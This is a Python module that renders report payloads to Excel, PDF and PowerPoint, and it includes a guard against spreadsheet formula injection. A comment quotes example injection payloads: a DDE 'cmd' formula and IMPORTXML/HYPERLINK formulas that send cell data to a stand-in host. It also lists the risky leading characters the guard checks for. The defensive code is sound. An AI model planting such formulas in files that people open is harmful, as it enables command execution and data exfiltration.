"""Server-side report renderer — the backend twin of frontend/src/lib/export.tsx.

Both on-demand and scheduled sends generate files here so output is identical to
the browser export. A `payload` mirrors the frontend ExportPayload:

    payload = {
      "title": str,
      "subtitle": str | None,
      "filename": str,                     # base name, no extension
      "sheets": [ {
          "name": str,
          "columns": [ Column ],
          "rows": [ dict ],
      } ],
    }

A Column is a dict:
    {"header": str, "key": str}            # value = row[key]
    optional: "fn": callable(row)->value   # computed value (overrides key)
              "money": True                # format as $#,##0.00 / right-align
              "align": "right" | "left"

xlsx uses openpyxl (already a dep). pdf uses reportlab (added to requirements).
"""
import re
from io import BytesIO

# Visual parity with export.tsx: header fill #1E3A5F = rgb(30,58,95).
HEADER_RGB = (30, 58, 95)
MONEY_FMT = "$#,##0.00"


def _raw(col, row):
    """Underlying value for a cell (callable fn wins over key)."""
    fn = col.get("fn")
    if fn is not None:
        try:
            return fn(row)
        except Exception:
            return None
    return row.get(col["key"])


def _money_str(v):
    try:
        return f"${float(v or 0):,.2f}"
    except (TypeError, ValueError):
        return "$0.00"


def _display(col, row):
    v = _raw(col, row)
    if col.get("money"):
        # A MISSING money value renders BLANK, never $0.00 (index §23w / §4c) — the same rule as the
        # browser exporter's money(); a real zero still renders $0.00.
        return "" if v is None or v == "" else _money_str(v)
    return "" if v is None else str(v)


# ── CSV / Excel formula injection (H7, 2026-08-05 security audit) ────────────────────────────────
# These workbooks are EMAILED and WhatsApp'd to owners and DMs, so a payload sitting in tenant data
# travels to a human who opens it in Excel. openpyxl types any string starting with "=" as a FORMULA
# (`data_type == 'f'` → an <f> element), which is exactly the DDE/exfil vector:
#     =cmd|'/C calc'!A0        =IMPORTXML(CONCAT("http://x/",A1),"//a")     =HYPERLINK("http://x?"&A1)
# (Proven live, not assumed: see harness_export_xss_upload.py section A.)
#
# THE FIX PRESERVES THE VALUE EXACTLY. It does NOT prefix an apostrophe — openpyxl stores an
# apostrophe as a literal character (Excel's quote-prefix is a STYLE, not text), so prefixing would
# print `'-1234.56` into every report. Instead the cell is forced to a text cell
# (`data_type = 's'` → `<c t="inlineStr">`) and marked with Excel's own quotePrefix style. Displayed
# characters are byte-identical; Excel never evaluates it, and never re-evaluates it if edited.
#
# THE ANTI-REGRESSION RULE IS THE WHOLE POINT. A value that merely LOOKS dangerous but is ordinary
# business data is left completely untouched:
#   · money columns are written as real FLOATS with a number format — never strings — so they can
#     never enter this path at all;
#   · a plain numeric string ("-1234.56", "+250", "-1,234.56", "-$99.00", "-3.5%", "1e5") is a number
#     to Excel, not a formula, and is passed through unchanged;
#   · dates and phone numbers never start with "="; "+1 (555) 123-4567" IS neutralised, and still
#     displays character-for-character as typed.
_RISKY_LEAD = ("=", "+", "-", "@", "\t", "\r", "\n")

_NUMERICISH = re.compile(
    r"""^[+-]?                 # optional sign — the ONLY reason a legitimate cell starts with + or -
        \$?\s*                 # optional currency symbol ("-$1,234.56")
        (?:\d{1,3}(?:,\d{3})+|\d+)   # 1,234,567  or  1234567
        (?:\.\d+)?             # decimals
        (?:[eE][+-]?\d+)?      # scientific notation
        \s*%?$                 # optional trailing percent
    """,
    re.VERBOSE,
)


def _is_formula_risky(value) -> bool:
    """True only for a STRING that Excel/Sheets would evaluate, and that is not ordinary numeric data.
    Non-strings (int/float/Decimal/date/datetime/bool/None) can never be formulas → always False."""
    if not isinstance(value, str) or not value:
        return False
    if value[0] not in _RISKY_LEAD:
        return False
    return not _NUMERICISH.match(value.strip())


def _para(v) -> str:
    """Escape for reportlab's Paragraph mini-markup. Paragraph parses `& < >` as markup, so a store
    literally named "A & B" — or any tenant string containing `<` — makes doc.build() RAISE and the
    whole PDF send fail. Data cells were already escaped; the title, subtitle, sheet name and column
    headers were not, and all four carry tenant text. Same escape, one helper (2026-08-05)."""
    return str("" if v is None else v).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


def _write_text_cell(cell, value):
    """Force `cell` to a literal TEXT cell without altering a single displayed character."""
    cell.value = value
    cell.data_type = "s"          # <c t="inlineStr"> — never <f>
    try:
        cell.quotePrefix = True   # Excel's own "this is text" marker; survives a user edit
    except Exception:
        pass                      # older openpyxl → data_type alone is already sufficient


# ── Excel ────────────────────────────────────────────────────────────────────
def build_xlsx(payload: dict) -> bytes:
    from openpyxl import Workbook
    from openpyxl.styles import Font, PatternFill, Alignment

    wb = Workbook()
    wb.remove(wb.active)  # drop the default sheet; we add our own
    header_fill = PatternFill("solid", fgColor="1E3A5F")
    header_font = Font(bold=True, color="FFFFFF")
    right = Alignment(horizontal="right")

    sheets = payload.get("sheets") or []
    if not sheets:
        sheets = [{"name": "Report", "columns": [], "rows": []}]

    for sheet in sheets:
        name = (sheet.get("name") or "Sheet")
        # Excel sheet-name rules: <=31 chars, no \/?*[]:
        for ch in "\\/?*[]:":
            name = name.replace(ch, " ")
        name = name[:31] or "Sheet"
        ws = wb.create_sheet(title=name)
        cols = sheet.get("columns") or []
        rows = sheet.get("rows") or []

        # Header row (a column header is configurable in places, so it gets the same guard)
        for ci, col in enumerate(cols, start=1):
            hdr = col.get("header") or ""
            c = ws.cell(row=1, column=ci)
            if _is_formula_risky(hdr):
                _write_text_cell(c, hdr)
            else:
                c.value = hdr
            c.fill = header_fill
            c.font = header_font

        # Data rows
        for ri, row in enumerate(rows, start=2):
            for ci, col in enumerate(cols, start=1):
                if col.get("money"):
                    # Money is a real float + number format — it can never be a formula, and this is
                    # also why the H7 guard cannot touch a single currency figure.
                    raw = _raw(col, row)
                    if raw is None or raw == "":
                        # A MISSING money value is not zero (index §23w, 2026-09-10; the Excel half closed
                        # 2026-09-26, §4c): a withheld or not-computed cell is left EMPTY, never written as
                        # $0.00. A real zero is still a number.
                        cell = ws.cell(row=ri, column=ci)
                        cell.alignment = right
                        continue
                    try:
                        val = float(raw)
                    except (TypeError, ValueError):
                        val = 0.0
                    cell = ws.cell(row=ri, column=ci, value=val)
                    cell.number_format = MONEY_FMT
                    cell.alignment = right
                else:
                    v = _raw(col, row)
                    v = "" if v is None else v
                    cell = ws.cell(row=ri, column=ci)
                    if _is_formula_risky(v):
                        _write_text_cell(cell, v)   # H7: literal text, displayed value unchanged
                    else:
                        cell.value = v
                    if col.get("align") == "right":
                        cell.alignment = right

        # Column widths (mirror export.tsx heuristic)
        for ci, col in enumerate(cols, start=1):
            hdr = col.get("header") or ""
            width = max(len(hdr) + 2, 12 if col.get("money") else 16)
            ws.column_dimensions[ws.cell(row=1, column=ci).column_letter].width = width

    out = BytesIO()
    wb.save(out)
    return out.getvalue()


# ── PDF ──────────────────────────────────────────────────────────────────────
def build_pdf(payload: dict) -> bytes:
    from reportlab.lib import colors
    from reportlab.lib.pagesizes import A4, landscape
    from reportlab.lib.units import mm
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.platypus import (
        SimpleDocTemplate, Table, TableStyle, Paragraph, Spacer, PageBreak,
    )

    buf = BytesIO()
    page_w, page_h = landscape(A4)
    margin = 12 * mm
    avail_w = page_w - 2 * margin
    doc = SimpleDocTemplate(
        buf, pagesize=landscape(A4),
        leftMargin=margin, rightMargin=margin, topMargin=margin, bottomMargin=margin,
        title=payload.get("title") or "Report",
    )
    styles = getSampleStyleSheet()
    h1 = ParagraphStyle("rh1", parent=styles["Heading1"], fontSize=15, spaceAfter=2)
    sub = ParagraphStyle("rsub", parent=styles["Normal"], fontSize=9, textColor=colors.grey, spaceAfter=8)
    h2 = ParagraphStyle("rh2", parent=styles["Heading2"], fontSize=11, spaceBefore=8, spaceAfter=4)
    cell_style = ParagraphStyle("rcell", parent=styles["Normal"], fontSize=7, leading=8)
    head_style = ParagraphStyle("rhead", parent=styles["Normal"], fontSize=7, leading=8,
                                textColor=colors.white, fontName="Helvetica-Bold")
    header_color = colors.Color(HEADER_RGB[0] / 255, HEADER_RGB[1] / 255, HEADER_RGB[2] / 255)

    story = [Paragraph(_para(payload.get("title") or "Report"), h1)]
    if payload.get("subtitle"):
        story.append(Paragraph(_para(payload["subtitle"]), sub))

    sheets = payload.get("sheets") or []
    for si, sheet in enumerate(sheets):
        cols = sheet.get("columns") or []
        rows = sheet.get("rows") or []
        if len(sheets) > 1:
            story.append(Paragraph(f"{_para(sheet.get('name') or 'Sheet')}  ({len(rows)})", h2))
        if not cols:
            continue
        if not rows:
            story.append(Paragraph("<i>No rows.</i>", cell_style))
            story.append(Spacer(1, 6))
            continue

        # Header cells as Paragraphs so long headers wrap.
        header_cells = [Paragraph(_para(c.get("header") or ""), head_style) for c in cols]
        data = [header_cells]
        for row in rows:
            line = []
            for col in cols:
                txt = _para(_display(col, row))
                line.append(Paragraph(txt, cell_style))
            data.append(line)

        # Even column widths across the available page width (always fits).
        col_w = avail_w / len(cols)
        table = Table(data, colWidths=[col_w] * len(cols), repeatRows=1)
        style = [
            ("BACKGROUND", (0, 0), (-1, 0), header_color),
            ("GRID", (0, 0), (-1, -1), 0.25, colors.Color(0.8, 0.8, 0.8)),
            ("VALIGN", (0, 0), (-1, -1), "TOP"),
            ("TOPPADDING", (0, 0), (-1, -1), 2),
            ("BOTTOMPADDING", (0, 0), (-1, -1), 2),
            ("ROWBACKGROUNDS", (0, 1), (-1, -1), [colors.white, colors.Color(0.96, 0.97, 0.98)]),
        ]
        for ci, col in enumerate(cols):
            if col.get("money") or col.get("align") == "right":
                style.append(("ALIGN", (ci, 1), (ci, -1), "RIGHT"))
        table.setStyle(TableStyle(style))
        story.append(table)
        story.append(Spacer(1, 8))

    doc.build(story)
    return buf.getvalue()


PPTX_MIME = "application/vnd.openxmlformats-officedocument.presentationml.presentation"

# Deck palette. ONE declaration, reused by every slide master below — the same discipline the
# frontend's theme tokens enforce, for the same reason: a colour written twice drifts.
DECK_DARK = (22, 32, 63)
DECK_NAVY = (30, 39, 97)
DECK_ICE = (202, 220, 252)
DECK_MUTED = (110, 122, 153)
DECK_RED = (192, 57, 43)
DECK_WHITE = (255, 255, 255)


def _pptx_text(frame, lines, *, size, color, bold=False, space_after=6):
    """Fill a text frame with one paragraph per line. `lines` are already WORDS — this renderer
    never composes a sentence, because the sentences have one home in the fold that made them."""
    from pptx.util import Pt
    from pptx.dml.color import RGBColor
    frame.word_wrap = True
    first = True
    for line in [str(x) for x in (lines or []) if str(x or "").strip()]:
        para = frame.paragraphs[0] if first else frame.add_paragraph()
        first = False
        para.text = line
        para.space_after = Pt(space_after)
        for run in para.runs:
            run.font.size = Pt(size)
            run.font.bold = bold
            run.font.color.rgb = RGBColor(*color)


def build_pptx(payload: dict) -> bytes:
    """A DECK out of `payload["slides"]` — the third format, beside xlsx and pdf.

    A slide is `{kind, eyebrow, title, bullets, table: {headers, rows} | None, note}`. The CONTENT
    is decided by whoever asked (for the weekly review that is
    `commcalc/weekly_review_deck.deck_payload`, a pure fold over the pack); this function only draws
    it, exactly as `build_xlsx` only draws a sheet. Owner ask 2026-11-17: *"The descriptive ppt is
    missing like one made before"*.
    """
    from pptx import Presentation
    from pptx.util import Inches, Pt
    from pptx.dml.color import RGBColor

    pres = Presentation()
    pres.slide_width, pres.slide_height = Inches(13.333), Inches(7.5)
    blank = pres.slide_layouts[6]
    W = 13.333

    def _bg(slide, rgb):
        slide.background.fill.solid()
        slide.background.fill.fore_color.rgb = RGBColor(*rgb)

    def _box(slide, x, y, w, h):
        return slide.shapes.add_textbox(Inches(x), Inches(y), Inches(w), Inches(h)).text_frame

    for s in (payload.get("slides") or []):
        kind = str(s.get("kind") or "item")
        slide = pres.slides.add_slide(blank)
        dark = kind in ("title", "section")
        if dark:
            _bg(slide, DECK_DARK if kind == "title" else DECK_NAVY)
        body_color = DECK_ICE if dark else (60, 60, 60)
        head_color = DECK_WHITE if dark else DECK_NAVY
        y = 1.3 if dark else 0.45
        if s.get("eyebrow"):
            _pptx_text(_box(slide, 0.8, y, W - 1.6, 0.4), [str(s["eyebrow"]).upper()],
                       size=13, color=DECK_ICE if dark else DECK_MUTED, bold=True)
            y += 0.45
        state = str(s.get("state") or "")
        title_color = (DECK_RED if (state and state != "measured" and not dark) else head_color)
        _pptx_text(_box(slide, 0.8, y, W - 1.6, 1.2 if dark else 0.9),
                   [s.get("title") or ""], size=38 if dark else 30, color=title_color, bold=True)
        y += 1.3 if dark else 1.0
        bullets = list(s.get("bullets") or [])
        table = s.get("table")
        if bullets:
            _pptx_text(_box(slide, 0.8, y, (W - 1.6) if not table else 5.3,
                            2.0 if not table else 4.6),
                       bullets, size=15 if not dark else 16, color=body_color, space_after=10)
        if table and (table.get("rows") or []):
            headers = [str(h) for h in (table.get("headers") or [])]
            rows = table.get("rows") or []
            left = 6.4 if bullets else 0.8
            width = W - left - 0.8
            shape = slide.shapes.add_table(len(rows) + 1, max(1, len(headers)),
                                           Inches(left), Inches(y),
                                           Inches(width), Inches(0.32 * (len(rows) + 1)))
            tbl = shape.table
            for ci, h in enumerate(headers):
                cell = tbl.cell(0, ci)
                cell.text = h
                for para in cell.text_frame.paragraphs:
                    for run in para.runs:
                        run.font.size, run.font.bold = Pt(10), True
                        run.font.color.rgb = RGBColor(*DECK_NAVY)
            for ri, row in enumerate(rows, start=1):
                for ci in range(len(headers)):
                    v = row[ci] if ci < len(row) else None
                    cell = tbl.cell(ri, ci)
                    cell.text = "" if v is None or v == "" else _fmt_cell(v)
                    for para in cell.text_frame.paragraphs:
                        for run in para.runs:
                            run.font.size = Pt(9)
                            run.font.color.rgb = RGBColor(40, 40, 40)
        if s.get("note"):
            _pptx_text(_box(slide, 0.8, 6.75, W - 1.6, 0.4), [s["note"]],
                       size=9, color=DECK_ICE if dark else DECK_MUTED)
    buf = BytesIO()
    pres.save(buf)
    return buf.getvalue()


def _fmt_cell(v):
    """A table cell as text. A number keeps thousands separators and cents; anything else is its own
    words — a WORD in a figure column is a measurement claim ("no target saved") and must survive
    into the deck as itself, never as 0."""
    if isinstance(v, bool):
        return "yes" if v else "no"
    if isinstance(v, (int, float)):
        return f"{v:,.2f}" if isinstance(v, float) else f"{v:,}"
    return str(v)


def render(payload: dict, fmt: str) -> tuple[bytes, str, str]:
    """Return (bytes, filename, mime) for fmt in {'xlsx','pdf','pptx'}."""
    base = payload.get("filename") or "report"
    if fmt == "xlsx":
        return (build_xlsx(payload), f"{base}.xlsx",
                "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")
    if fmt == "pdf":
        return build_pdf(payload), f"{base}.pdf", "application/pdf"
    if fmt == "pptx":
        return build_pptx(payload), f"{base}.pptx", PPTX_MIME
    raise ValueError(f"unknown format {fmt!r}")
